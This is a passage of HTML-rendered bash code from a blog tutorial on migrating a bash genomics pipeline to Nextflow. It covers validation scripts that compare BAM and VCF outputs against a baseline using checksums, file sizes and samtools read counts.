36%)">return</span><span class="token plain"> </span><span class="token number" style="color:hsl(35, 99%, 36%)">1</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">fi</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Compare all output files</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token builtin class-name" style="color:hsl(35, 99%, 36%)">echo</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">"=== File Comparisons ==="</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token builtin class-name" style="color:hsl(35, 99%, 36%)">declare</span><span class="token plain"> </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-i</span><span class="token plain"> </span><span class="token assign-left variable" style="color:hsl(221, 87%, 60%)">pass</span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token number" style="color:hsl(35, 99%, 36%)">0</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token builtin class-name" style="color:hsl(35, 99%, 36%)">declare</span><span class="token plain"> </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-i</span><span class="token plain"> </span><span class="token assign-left variable" style="color:hsl(221, 87%, 60%)">fail</span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token number" style="color:hsl(35, 99%, 36%)">0</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">for</span><span class="token plain"> </span><span class="token for-or-select variable" style="color:hsl(221, 87%, 60%)">file</span><span class="token plain"> </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">in</span><span class="token plain"> aligned.bam marked.bam variants.vcf</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">;</span><span class="token plain"> </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">do</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">if</span><span class="token plain"> compare_file </span><span class="token string" style="color:hsl(119, 34%, 47%)">"</span><span class="token string variable" style="color:hsl(221, 87%, 60%)">$file</span><span class="token string" style="color:hsl(119, 34%, 47%)">"</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">;</span><span class="token plain"> </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">then</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">            </span><span class="token variable punctuation" style="color:hsl(119, 34%, 47%)">((</span><span class="token variable" style="color:hsl(221, 87%, 60%)">pass</span><span class="token variable operator" style="color:hsl(221, 87%, 60%)">++</span><span class="token variable punctuation" style="color:hsl(119, 34%, 47%)">))</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">else</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">            </span><span class="token variable punctuation" style="color:hsl(119, 34%, 47%)">((</span><span class="token variable" style="color:hsl(221, 87%, 60%)">fail</span><span class="token variable operator" style="color:hsl(221, 87%, 60%)">++</span><span class="token variable punctuation" style="color:hsl(119, 34%, 47%)">))</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">fi</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">done</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token builtin class-name" style="color:hsl(35, 99%, 36%)">echo</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">""</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token builtin class-name" style="color:hsl(35, 99%, 36%)">echo</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">"=== Summary ==="</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token builtin class-name" style="color:hsl(35, 99%, 36%)">echo</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">"Passed: </span><span class="token string variable" style="color:hsl(221, 87%, 60%)">$pass</span><span class="token string" style="color:hsl(119, 34%, 47%)">"</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token builtin class-name" style="color:hsl(35, 99%, 36%)">echo</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">"Failed: </span><span class="token string variable" style="color:hsl(221, 87%, 60%)">$fail</span><span class="token string" style="color:hsl(119, 34%, 47%)">"</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token builtin class-name" style="color:hsl(35, 99%, 36%)">echo</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">""</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">     </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">if</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">[</span><span class="token plain"> </span><span class="token variable" style="color:hsl(221, 87%, 60%)">$fail</span><span class="token plain"> </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-eq</span><span class="token plain"> </span><span class="token number" style="color:hsl(35, 99%, 36%)">0</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">]</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">;</span><span class="token plain"> </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">then</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">         </span><span class="token builtin class-name" style="color:hsl(35, 99%, 36%)">echo</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">"VALIDATION SUCCESSFUL: All outputs match baseline!"</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">         </span><span class="token builtin class-name" style="color:hsl(35, 99%, 36%)">exit</span><span class="token plain"> </span><span class="token number" style="color:hsl(35, 99%, 36%)">0</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">     </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">else</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">         </span><span class="token builtin class-name" style="color:hsl(35, 99%, 36%)">echo</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">"VALIDATION FAILED: </span><span class="token string variable" style="color:hsl(221, 87%, 60%)">$fail</span><span class="token string" style="color:hsl(119, 34%, 47%)"> file(s) differ from baseline"</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">         </span><span class="token builtin class-name" style="color:hsl(35, 99%, 36%)">exit</span><span class="token plain"> </span><span class="token number" style="color:hsl(35, 99%, 36%)">1</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">     </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">fi</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token plain"> </span><span class="token operator" style="color:hsl(221, 87%, 60%)">|</span><span class="token plain"> </span><span class="token function" style="color:hsl(221, 87%, 60%)">tee</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">"</span><span class="token string variable" style="color:hsl(221, 87%, 60%)">$VALIDATION_REPORT</span><span class="token string" style="color:hsl(119, 34%, 47%)">"</span><br></span></code></pre></div></div>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="32-run-comparison">3.2 Run Comparison<a href="https://riverxdata.github.io/river-docs/blog/migrate-bash-nextflow-enterprise-pipeline#32-run-comparison" class="hash-link" aria-label="Direct link to 3.2 Run Comparison" title="Direct link to 3.2 Run Comparison" translate="no">​</a></h3>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token shebang important" style="color:hsl(230, 8%, 24%);font-weight:bold">#!/bin/bash</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Run the migration validation</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># First, ensure baseline exists</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token keyword" style="color:hsl(301, 63%, 40%)">if</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">[</span><span class="token plain"> </span><span class="token operator" style="color:hsl(221, 87%, 60%)">!</span><span class="token plain"> </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-d</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">"/results/baseline"</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">]</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">;</span><span class="token plain"> </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">then</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token builtin class-name" style="color:hsl(35, 99%, 36%)">echo</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">"Error: Baseline not found. Run original_pipeline.sh first."</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token builtin class-name" style="color:hsl(35, 99%, 36%)">exit</span><span class="token plain"> </span><span class="token number" style="color:hsl(35, 99%, 36%)">1</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token keyword" style="color:hsl(301, 63%, 40%)">fi</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Run Nextflow pipeline</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token builtin class-name" style="color:hsl(35, 99%, 36%)">echo</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">"Running Nextflow migration..."</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">nextflow run main.nf </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">--input_dir</span><span class="token plain"> ./data/reads </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">--reference</span><span class="token plain"> ./data/reference/hg38.fasta </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-profile</span><span class="token plain"> </span><span class="token function" style="color:hsl(221, 87%, 60%)">docker</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-resume</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Validate outputs</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token builtin class-name" style="color:hsl(35, 99%, 36%)">echo</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">""</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token builtin class-name" style="color:hsl(35, 99%, 36%)">echo</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">"Validating migration..."</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">bash</span><span class="token plain"> validate_migration.sh</span><br></span></code></pre></div></div>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="33-detailed-diff-analysis-for-failed-files">3.3 Detailed Diff Analysis for Failed Files<a href="https://riverxdata.github.io/river-docs/blog/migrate-bash-nextflow-enterprise-pipeline#33-detailed-diff-analysis-for-failed-files" class="hash-link" aria-label="Direct link to 3.3 Detailed Diff Analysis for Failed Files" title="Direct link to 3.3 Detailed Diff Analysis for Failed Files" translate="no">​</a></h3>
<p>If checksums don't match, investigate the difference:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token shebang important" style="color:hsl(230, 8%, 24%);font-weight:bold">#!/bin/bash</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># deep_diff.sh - Detailed analysis of differences</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token assign-left variable" style="color:hsl(221, 87%, 60%)">BASELINE</span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token variable" style="color:hsl(221, 87%, 60%)">$1</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token assign-left variable" style="color:hsl(221, 87%, 60%)">MIGRATED</span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token variable" style="color:hsl(221, 87%, 60%)">$2</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token assign-left variable" style="color:hsl(221, 87%, 60%)">FILENAME</span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token variable" style="color:hsl(221, 87%, 60%)">$(</span><span class="token variable function" style="color:hsl(221, 87%, 60%)">basename</span><span class="token variable" style="color:hsl(221, 87%, 60%)"> </span><span class="token variable string" style="color:hsl(119, 34%, 47%)">"</span><span class="token variable string variable" style="color:hsl(221, 87%, 60%)">$BASELINE</span><span class="token variable string" style="color:hsl(119, 34%, 47%)">"</span><span class="token variable" style="color:hsl(221, 87%, 60%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token builtin class-name" style="color:hsl(35, 99%, 36%)">echo</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">"=== Detailed Comparison: </span><span class="token string variable" style="color:hsl(221, 87%, 60%)">$FILENAME</span><span class="token string" style="color:hsl(119, 34%, 47%)"> ==="</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># 1. Check file sizes</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token assign-left variable" style="color:hsl(221, 87%, 60%)">BASELINE_SIZE</span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token variable" style="color:hsl(221, 87%, 60%)">$(</span><span class="token variable function" style="color:hsl(221, 87%, 60%)">stat</span><span class="token variable" style="color:hsl(221, 87%, 60%)"> -f%z </span><span class="token variable string" style="color:hsl(119, 34%, 47%)">"</span><span class="token variable string variable" style="color:hsl(221, 87%, 60%)">$BASELINE</span><span class="token variable string" style="color:hsl(119, 34%, 47%)">"</span><span class="token variable" style="color:hsl(221, 87%, 60%)"> </span><span class="token variable operator file-descriptor important" style="color:hsl(230, 8%, 24%);font-weight:bold">2</span><span class="token variable operator" style="color:hsl(221, 87%, 60%)">&gt;</span><span class="token variable" style="color:hsl(221, 87%, 60%)">/dev/null </span><span class="token variable operator" style="color:hsl(221, 87%, 60%)">||</span><span class="token variable" style="color:hsl(221, 87%, 60%)"> </span><span class="token variable function" style="color:hsl(221, 87%, 60%)">stat</span><span class="token variable" style="color:hsl(221, 87%, 60%)"> -c%s </span><span class="token variable string" style="color:hsl(119, 34%, 47%)">"</span><span class="token variable string variable" style="color:hsl(221, 87%, 60%)">$BASELINE</span><span class="token variable string" style="color:hsl(119, 34%, 47%)">"</span><span class="token variable" style="color:hsl(221, 87%, 60%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token assign-left variable" style="color:hsl(221, 87%, 60%)">MIGRATED_SIZE</span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token variable" style="color:hsl(221, 87%, 60%)">$(</span><span class="token variable function" style="color:hsl(221, 87%, 60%)">stat</span><span class="token variable" style="color:hsl(221, 87%, 60%)"> -f%z </span><span class="token variable string" style="color:hsl(119, 34%, 47%)">"</span><span class="token variable string variable" style="color:hsl(221, 87%, 60%)">$MIGRATED</span><span class="token variable string" style="color:hsl(119, 34%, 47%)">"</span><span class="token variable" style="color:hsl(221, 87%, 60%)"> </span><span class="token variable operator file-descriptor important" style="color:hsl(230, 8%, 24%);font-weight:bold">2</span><span class="token variable operator" style="color:hsl(221, 87%, 60%)">&gt;</span><span class="token variable" style="color:hsl(221, 87%, 60%)">/dev/null </span><span class="token variable operator" style="color:hsl(221, 87%, 60%)">||</span><span class="token variable" style="color:hsl(221, 87%, 60%)"> </span><span class="token variable function" style="color:hsl(221, 87%, 60%)">stat</span><span class="token variable" style="color:hsl(221, 87%, 60%)"> -c%s </span><span class="token variable string" style="color:hsl(119, 34%, 47%)">"</span><span class="token variable string variable" style="color:hsl(221, 87%, 60%)">$MIGRATED</span><span class="token variable string" style="color:hsl(119, 34%, 47%)">"</span><span class="token variable" style="color:hsl(221, 87%, 60%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token builtin class-name" style="color:hsl(35, 99%, 36%)">echo</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">"File sizes:"</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token builtin class-name" style="color:hsl(35, 99%, 36%)">echo</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">"  Baseline: </span><span class="token string variable" style="color:hsl(221, 87%, 60%)">$BASELINE_SIZE</span><span class="token string" style="color:hsl(119, 34%, 47%)"> bytes"</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token builtin class-name" style="color:hsl(35, 99%, 36%)">echo</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">"  Migrated: </span><span class="token string variable" style="color:hsl(221, 87%, 60%)">$MIGRATED_SIZE</span><span class="token string" style="color:hsl(119, 34%, 47%)"> bytes"</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token keyword" style="color:hsl(301, 63%, 40%)">if</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">[</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">"</span><span class="token string variable" style="color:hsl(221, 87%, 60%)">$BASELINE_SIZE</span><span class="token string" style="color:hsl(119, 34%, 47%)">"</span><span class="token plain"> </span><span class="token operator" style="color:hsl(221, 87%, 60%)">!=</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">"</span><span class="token string variable" style="color:hsl(221, 87%, 60%)">$MIGRATED_SIZE</span><span class="token string" style="color:hsl(119, 34%, 47%)">"</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">]</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">;</span><span class="token plain"> </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">then</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token builtin class-name" style="color:hsl(35, 99%, 36%)">echo</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">"  Size difference detected"</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token keyword" style="color:hsl(301, 63%, 40%)">fi</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># 2. For BAM files: compare with samtools</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token keyword" style="color:hsl(301, 63%, 40%)">if</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">[</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">[</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">"</span><span class="token string variable" style="color:hsl(221, 87%, 60%)">$FILENAME</span><span class="token string" style="color:hsl(119, 34%, 47%)">"</span><span class="token plain"> </span><span class="token operator" style="color:hsl(221, 87%, 60%)">==</span><span class="token plain"> *.bam </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">]</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">]</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">;</span><span class="token plain"> </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">then</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token builtin class-name" style="color:hsl(35, 99%, 36%)">echo</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">""</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token builtin class-name" style="color:hsl(35, 99%, 36%)">echo</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">"BAM file analysis:"</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Compare read counts</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token assign-left variable" style="color:hsl(221, 87%, 60%)">BASELINE_READS</span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token variable" style="color:hsl(221, 87%, 60%)">$(</span><span class="token variable" style="color:hsl(221, 87%, 60%)">samtools view </span><span class="token variable parameter variable" style="color:hsl(221, 87%, 60%)">-c</span><span class="token variable" style="color:hsl(221, 87%, 60%)"> </span><span class="token variable string" style="color:hsl(119, 34%, 47%)">"</span><span class="token variable string variable" style="color:hsl(221, 87%, 60%)">$BASELINE</span><span class="token variable string" style="color:hsl(119, 34%, 47%)">"</span><span class="token variable" style="color:hsl(221, 87%, 60%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token assign-left variable" style="color:hsl(221, 87%, 60%)">MIGRATED_READS</span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token variable" style="color:hsl(221, 87%, 60%)">$(</span><span class="token variable" style="color:hsl(221, 87%, 60%)">samtools view </span><span class="token variable parameter variable" style="color:hsl(221, 87%, 60%)">-c</span><span class="token variable" style="color:hsl(221, 87%, 60%)"> </span><span class="token variable string" style="color:hsl(119, 34%, 47%)">"</span><span class="token variable string variable" style="color:hsl(221, 87%, 60%)">$MIGRATED</span><span class="token variable string" style="color:hsl(119, 34%, 47%)">"</span><span class="token variable" style="color:hsl(221, 87%, 60%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token builtin class-name" style="color:hsl(35, 99%, 36%)">echo</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">"  Baseline reads: </span><span class="token string variable" style="color:hsl(221, 87%, 60%)">$BASELINE_READS</span><span class="token string" style="color:hsl(119, 34%, 47%)">"</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token builtin class-name" style="color:hsl(35, 99%, 36%)">echo</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">"  Migrated reads: </span><span class="token string variable" style="color:hsl(221, 87%, 60%)">$MIGRATED_READS</span><span class="token string" style="color:hsl(119, 34%, 47%)">"</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">if</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">[</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">"</span><span class="token string variable" style="color:hsl(221, 87%, 60%)">$BASELINE_READS</span><span class="token string" style="color:hsl(119, 34%, 47%)">"</span><span class="token plain"> </span><span class="token operator" style="color:hsl(221, 87%, 60%)">!=</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">"</span><span class="token string variable" style="color:hsl(221, 87%, 60%)">$MIGRATED_READS</span><span class="token string" style="color:hsl(119, 34%, 47%)">"</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">]</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">;</span><span class="token plain"> </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">then</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        </span><span class="token builtin class-name" style="color:hsl(35, 99%, 36%)">echo</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">"  Read count mismatch!"</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">fi</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Compare first 10 reads</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token builtin class-name" style="color:hsl(35, 99%, 36%)">echo</span><span class="token plain"> </span><span class="token string" 